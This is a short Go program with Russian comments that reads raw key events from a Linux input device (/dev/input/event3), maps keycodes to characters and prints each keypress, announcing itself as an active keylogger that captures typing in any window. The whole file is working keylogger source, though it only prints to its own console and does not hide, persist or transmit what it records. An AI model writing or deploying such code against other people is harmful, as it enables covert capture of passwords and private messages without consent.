package main

import (
	"encoding/binary"
	"fmt"
	"os"
)

type inputEvent struct {
	TimeSec  uint64
	TimeUsec uint64
	Type     uint16
	Code     uint16
	Value    int32
}

// Словарь кодов (базовый набор)
var keyMap = map[uint16]string{
	1: "[ESC]", 2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9", 11: "0",
	16: "q", 17: "w", 18: "e", 19: "r", 20: "t", 21: "y", 22: "u", 23: "i", 24: "o", 25: "p",
	30: "a", 31: "s", 32: "d", 33: "f", 34: "g", 35: "h", 36: "j", 37: "k", 38: "l",
	44: "z", 45: "x", 46: "c", 47: "v", 48: "b", 49: "n", 50: "m",
	28: "[ENTER]", 57: " ", 14: "[BACKSPACE]",
}

func main() {
	// Проверь свой event номер еще раз через sudo libinput list-devices
	file, err := os.Open("/dev/input/event3") 
	if err != nil {
		fmt.Println("Ошибка прав!", err)
		return
	}
	defer file.Close()

	fmt.Println("Кейлоггер активен... Пиши в любом окне:")

	for {
		var ev inputEvent
		binary.Read(file, binary.LittleEndian, &ev)

		// Type 1 (EV_KEY), Value 1 (KeyDown)
		if ev.Type == 1 && ev.Value == 1 {
			char, ok := keyMap[ev.Code]
			if ok {
				fmt.Print(char) // Печатаем букву
			} else {
				fmt.Printf("[%d]", ev.Code) // Если кода нет в словаре, пишем число
			}
		}
	}
}
